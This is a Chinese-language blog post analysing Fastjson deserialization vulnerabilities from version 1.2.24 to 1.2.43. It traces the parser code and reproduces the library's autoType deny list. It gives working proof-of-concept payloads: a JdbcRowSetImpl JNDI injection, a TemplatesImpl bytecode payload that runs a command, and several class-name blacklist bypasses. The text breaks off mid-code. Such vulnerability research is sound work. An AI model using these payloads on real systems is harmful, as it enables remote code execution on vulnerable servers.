<!DOCTYPE html><html lang="zh"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta name="viewport" content="width=device-width, initial-scale=0.5"><link rel="stylesheet" href="/css/post.css"><link rel="icon" href="/img/favicon.png"><title>Fastjson浅析</title><meta name="generator" content="Hexo 5.4.0"><link rel="stylesheet" href="/css/prism.css" type="text/css"></head><body>　　<div class="inner"><h2>Fastjson浅析</h2><h1 id="0x0-Fastjson"><a href="#0x0-Fastjson" class="headerlink" title="0x0 Fastjson"></a>0x0 Fastjson</h1><p>在Fastjson中提供两个主要接口toJsonString和parseObject来分别实现序列化和反序列化，使用Fastjson可以很方便的将json字符串反序列化成对象，并且基于autoType的特性，在使用特殊key时会自动实例化类、调用get/set方法设置相关成员属性。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 序列化</span></span><br><span class="line">String jsonString = JSON.toJSONString(user);</span><br><span class="line"><span class="comment">// 反序列化</span></span><br><span class="line">User user = JSON.parseObject(jsonString, User.class);</span><br></pre></td></tr></table></figure>

<p>Fastjson架构图：</p>
<p><img src="/2022/06/08/Fastjson%E5%88%86%E6%9E%90/JdbcRowSetImpl_1.png" alt="JdbcRowSetImpl_1"></p>
<p>（图来自：<a target="_blank" rel="noopener" href="http://xxlegend.com/2017/12/06/%E5%9F%BA%E4%BA%8EJdbcRowSetImpl%E7%9A%84Fastjson%20RCE%20PoC%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90/">http://xxlegend.com/2017/12/06/%E5%9F%BA%E4%BA%8EJdbcRowSetImpl%E7%9A%84Fastjson%20RCE%20PoC%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90/</a>)</p>
<blockquote>
<p>主要的功能都是在<code>DefaultJSONParser</code>类中实现的，在这个类中会应用其他的一些外部类来完成后续操作。<code>ParserConfig</code>主要是进行配置信息的初始化，<code>JSONLexer</code>主要是对json字符串进行处理并分析，反序列化在<code>JavaBeanDeserializer</code>中处理。</p>
</blockquote>
<p>json字符串的解析流程：</p>
<ol>
<li><p>DefaultJSONParser初始化，相关配置初始化</p>
</li>
<li><p>通过deserializer序列化对象，在parseObject中，如果指定了解析<code>class</code>则根据相应class获取<code>deserializer</code>，如果说不是<code>initDeserializer</code>中的类，则会调用<code>JavaBeanDeserializer#deserialze</code>转交<code>FastjsonASMDeserializer</code>利用Fastjson自己实现的ASM流程生成处理类.</p>
</li>
<li><p>解析json字符串的字段与值，通过标识位<code>lexer.token</code>的值，比如LBRACE（左括号）、LBRACKET （圆括号）等，进入4、5，并且设置下一个标识 <code>lexer.nextToken</code></p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 正常的kv结构</span><br><span class="line">&#123;&quot;k&quot;:&quot;v&quot;&#125;</span><br><span class="line"></span><br><span class="line"># 嵌套结构</span><br><span class="line">&#123;&quot;k&quot;:&#123;&quot;kk&quot;:&quot;vv&quot;,&quot;kk&quot;:&quot;vv&quot;&#125;,&quot;k&quot;:&#123;&quot;k&quot;:&quot;kk&quot;,&quot;kk&quot;:&quot;vv&quot;,&quot;kk&quot;:&quot;vv&quot;&#125;&#125;,k:v&#125;</span><br></pre></td></tr></table></figure>

<p>最开始解析的标志位为<code>&#123;</code></p>
<ol>
<li>判断下一个标志位是否为<code>&quot;</code>，如果是<code>&quot;</code>则提取key值，这时的标志位为<code>&quot;</code>。</li>
<li>判断下一个标志位是否为<code>:</code>：<ul>
<li>如果为<code>:</code>则判断下一个标志位是否为<code>&quot;</code>，如果是，则获取value值，这时的标志位为<code>&quot;</code>。</li>
<li>如果为<code>&#123;</code>则重复1、2的过程。</li>
</ul>
</li>
<li>判断下一个标志位是否为<code>&#125;</code>：<ul>
<li>如果为<code>&#125;</code>则表示这一个单元的解析结束</li>
<li>如果为<code>,</code>则表示要解析下一个kv的数据，重复1、2、3</li>
</ul>
</li>
</ol>
</blockquote>
</li>
<li><p>判断解析的字符串中是否存在symbolTable中的字段，例如<code>@type</code>、<code>$ref</code> ，如果出现了<code>@type</code>则交由<code>public final Object parseObject(final Map object, Object fieldName)</code>来处理</p>
</li>
<li><p>如果解析出来的字符串为键、值则追加到map中，如果为双引号、括号等，重复3、4</p>
</li>
</ol>
<h1 id="0x1-Version-1-2-24"><a href="#0x1-Version-1-2-24" class="headerlink" title="0x1 Version 1.2.24"></a>0x1 Version 1.2.24</h1><p>环境：</p>
<ul>
<li>Fastjson版本 1.2.24</li>
<li>jdk参考JNDI，如果是RMI 需要低版本的JDK，这里用1.8.102</li>
</ul>
<p>poc1:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String payload = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/ExecTest\&quot;,&quot;</span> +</span><br><span class="line"><span class="string">&quot; \&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>



<p><img src="/2022/06/08/Fastjson%E5%88%86%E6%9E%90/image-20220608103153064.png" alt="image-20220608103153064"></p>
<p>如果是@type 会特殊处理，实例化该类</p>
<p><img src="/2022/06/08/Fastjson%E5%88%86%E6%9E%90/image-20220608154409186.png" alt="image-20220608154409186"></p>
<p>config.getDeserilizer创建Deserilizer</p>
<p><img src="/2022/06/08/Fastjson%E5%88%86%E6%9E%90/image-20220608154220293.png" alt="image-20220608154220293"></p>
<p>如果要反序列化的类不是内置的，则会创建JavaBeanDeserializer</p>
<p><img src="/2022/06/08/Fastjson%E5%88%86%E6%9E%90/image-20220608154834849.png" alt="image-20220608154834849"></p>
<p>通过ASMFactory工厂创建JavaBeanDeserializer</p>
<p><img src="/2022/06/08/Fastjson%E5%88%86%E6%9E%90/image-20220608155009897.png" alt="image-20220608155009897"></p>
<p>asmFactory.createJavaBeanDeserializer</p>
<p><img src="/2022/06/08/Fastjson%E5%88%86%E6%9E%90/image-20220608155138953.png" alt="image-20220608155138953"></p>
<p><code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#deserialze(com.alibaba.fastjson.parser.DefaultJSONParser, java.lang.reflect.Type, java.lang.Object)</code></p>
<p>使用ASM工厂构建出来的JavaBeanDeserializer.Deserializer进行反序列化</p>
<p><img src="/2022/06/08/Fastjson%E5%88%86%E6%9E%90/image-20220608155451795.png" alt="image-20220608155451795"></p>
<p>类实例化完之后会继续解析字段<code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#parseRest</code></p>
<p><img src="/2022/06/08/Fastjson%E5%88%86%E6%9E%90/image-20220608155910782.png" alt="image-20220608155910782"></p>
<p>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#parseField</p>
<p><img src="/2022/06/08/Fastjson%E5%88%86%E6%9E%90/image-20220608160151099.png" alt="image-20220608160151099"></p>
<p>com.alibaba.fastjson.parser.deserializer.DefaultFieldDeserializer#parseField</p>
<p><img src="/2022/06/08/Fastjson%E5%88%86%E6%9E%90/image-20220608160234068.png" alt="image-20220608160234068"></p>
<p>com.alibaba.fastjson.parser.deserializer.FieldDeserializer#setValue(java.lang.Object, java.lang.Object)</p>
<p><img src="/2022/06/08/Fastjson%E5%88%86%E6%9E%90/image-20220608160303364.png" alt="image-20220608160303364"></p>
<p>通过反射执行JdbcRowSetImpl.setAutoCommit，方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAutoCommit</span><span class="params">(<span class="keyword">boolean</span> var1)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">this</span>.conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.conn = <span class="keyword">this</span>.connect();</span><br><span class="line">        <span class="keyword">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>this.connect</code>  调用<code>this.getDataSourceName()</code>，进行JNDI注入</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Connection <span class="title">connect</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">this</span>.conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.conn;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>.getDataSourceName() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            InitialContext var1 = <span class="keyword">new</span> InitialContext();</span><br><span class="line">            DataSource var2 = (DataSource)var1.lookup(<span class="keyword">this</span>.getDataSourceName());</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.getUsername() != <span class="keyword">null</span> &amp;&amp; !<span class="keyword">this</span>.getUsername().equals(<span class="string">&quot;&quot;</span>)?var2.getConnection(<span class="keyword">this</span>.getUsername(), <span class="keyword">this</span>.getPassword()):var2.getConnection();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SQLException(<span class="keyword">this</span>.resBundle.handleGetObject(<span class="string">&quot;jdbcrowsetimpl.connect&quot;</span>).toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.getUrl() != <span class="keyword">null</span>?DriverManager.getConnection(<span class="keyword">this</span>.getUrl(), <span class="keyword">this</span>.getUsername(), <span class="keyword">this</span>.getPassword()):<span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>这里RCE的有两个关键点：</p>
<ol>
<li><p>实例化类</p>
</li>
<li><p>反射执行方法</p>
</li>
</ol>
<p><img src="/2022/06/08/Fastjson%E5%88%86%E6%9E%90/image-20220608151545049.png" alt="image-20220608151545049"></p>
<p>Version 1.2.24 及之前还有一个POC</p>
<p>POC2:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.codec.binary.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">V124_POC2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String evilCode_base64 = readClass();</span><br><span class="line">        <span class="keyword">final</span> String NASTY_CLASS = <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">        String payload = <span class="string">&quot;&#123;&#x27;rand1&#x27;:&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS + <span class="string">&quot;\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;_bytecodes\&quot;:[\&quot;&quot;</span> + evilCode_base64 + <span class="string">&quot;\&quot;],&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#x27;_name&#x27;:&#x27;aaa&#x27;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#x27;_tfactory&#x27;:&#123;&#125;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#x27;_outputProperties&#x27;:&#123;&#125;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&#125;\n&quot;</span>;</span><br><span class="line">        JSON.parseObject(payload,User.class , Feature.SupportNonPublicField);</span><br><span class="line">        System.out.println(payload);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">AaAa</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">readClass</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        CtClass cc = pool.get(AaAa.class.getName());</span><br><span class="line">        String cmd = <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        String randomClassName = <span class="string">&quot;AaAa&quot;</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));</span><br><span class="line">        <span class="keyword">byte</span>[] evilCode = cc.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Base64.encodeBase64String(evilCode);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>TemplatesImpl类中<code>_bytecodes</code>、<code>_tfactory</code>、<code>_name</code>、<code>_outputProperties</code>、<code>_class</code>并没有对应的setter，所以要为这些private属性赋值，就需要开启SupportNonPublicField特性</p>
</blockquote>
<h1 id="0x2-Version-1-2-25-1-2-41"><a href="#0x2-Version-1-2-25-1-2-41" class="headerlink" title="0x2 Version 1.2.25 - 1.2.41"></a>0x2 Version 1.2.25 - 1.2.41</h1><p>1.2.25使用checkAutoType检查只对指定的类进行实例化</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;</span><br><span class="line">        <span class="keyword">if</span> (typeName == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> String className = typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 位置1，开启了autoTypeSupport，先白名单，再黑名单</span></span><br><span class="line">        <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">                String accept = acceptList[i];</span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">                String deny = denyList[i];</span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 位置2，从已存在的map中获取clazz</span></span><br><span class="line">        Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">        <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">            clazz = deserializers.findClass(typeName);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (expectClass != <span class="keyword">null</span> &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 位置3，没开启autoTypeSupport，依然会进行黑白名单检测，先黑名单，再白名单</span></span><br><span class="line">        <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">                String deny = denyList[i];</span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">                String accept = acceptList[i];</span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                    clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (expectClass != <span class="keyword">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 位置4，过了黑白名单，autoTypeSupport开启，就加载目标类</span></span><br><span class="line">        <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">            clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// ClassLoader、DataSource子类/子接口检测</span></span><br><span class="line">            <span class="keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) <span class="comment">// classloader is danger</span></span><br><span class="line">                    || DataSource.class.isAssignableFrom(clazz) <span class="comment">// dataSource can load jdbc driver</span></span><br><span class="line">                    ) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>黑名单：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">bsh</span><br><span class="line">com.mchange</span><br><span class="line">com.sun.</span><br><span class="line">java.lang.Thread</span><br><span class="line">java.net.Socket</span><br><span class="line">java.rmi</span><br><span class="line">javax.xml</span><br><span class="line">org.apache.bcel</span><br><span class="line">org.apache.commons.beanutils</span><br><span class="line">org.apache.commons.collections.Transformer</span><br><span class="line">org.apache.commons.collections.functors</span><br><span class="line">org.apache.commons.collections4.comparators</span><br><span class="line">org.apache.commons.fileupload</span><br><span class="line">org.apache.myfaces.context.servlet</span><br><span class="line">org.apache.tomcat</span><br><span class="line">org.apache.wicket.util</span><br><span class="line">org.codehaus.groovy.runtime</span><br><span class="line">org.hibernate</span><br><span class="line">org.jboss</span><br><span class="line">org.mozilla.javascript</span><br><span class="line">org.python.core</span><br><span class="line">org.springframework</span><br></pre></td></tr></table></figure>



<p>绕过:</p>
<p>在<code>com.alibaba.fastjson.util.TypeUtils#loadClass(java.lang.String, java.lang.ClassLoader)</code>中实例化类，如果类名中以”L”并且以”;”结尾，则会去除头和尾的特殊字符，所以可以通过在前后加”L;”绕过</p>
<p><img src="/2022/06/08/Fastjson%E5%88%86%E6%9E%90/image-20220608182349288.png" alt="image-20220608182349288"></p>
<p>POC:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">V125</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String payload = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/ExecTest\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot; \&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">        JSON.parseObject(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/08/Fastjson%E5%88%86%E6%9E%90/image-20220608183925157.png" alt="image-20220608183925157"></p>
<h1 id="0x3-Version-1-2-42"><a href="#0x3-Version-1-2-42" class="headerlink" title="0x3 Version 1.2.42"></a>0x3 Version 1.2.42</h1><p>在<code>com.alibaba.fastjson.parser.ParserConfig#checkAutoType(java.lang.String, java.lang.Class&lt;?&gt;, int)</code>判断className前后是否为 L、; ，如果是则截取第二个字符和到倒数第二个字符</p>
<p><img src="/2022/06/08/Fastjson%E5%88%86%E6%9E%90/image-20220608204855159.png" alt="image-20220608204855159"></p>
<p>双写 “LL”、”;;” 即可绕过</p>
<p><img src="/2022/06/08/Fastjson%E5%88%86%E6%9E%90/image-20220608185502330.png" alt="image-20220608185502330"></p>
<h1 id="0x4-Version-1-2-43"><a href="#0x4-Version-1-2-43" class="headerlink" title="0x4 Version 1.2.43"></a>0x4 Version 1.2.43</h1><p>在<code>com.alibaba.fastjson.parser.ParserConfig#checkAutoType(java.lang.String, java.lang.Class&lt;?&gt;, int)</code>中修复，如果前后有”L”、”;”就抛出异常：</p>
<p><img src="/2022/06/08/Fastjson%E5%88%86%E6%9E%90/image-20220608205304105.png" alt="image-20220608205304105"></p>
<p>在<code>com.alibaba.fastjson.util.TypeUtils#loadClass</code>中可以看到如果以 “[“开头也会被特殊处理，即可绕过黑名单</p>
<p><img src="/2022/06/08/Fastjson%E5%88%86%E6%9E%90/image-20220608185727632.png" alt="image-20220608185727632"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">V143</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span 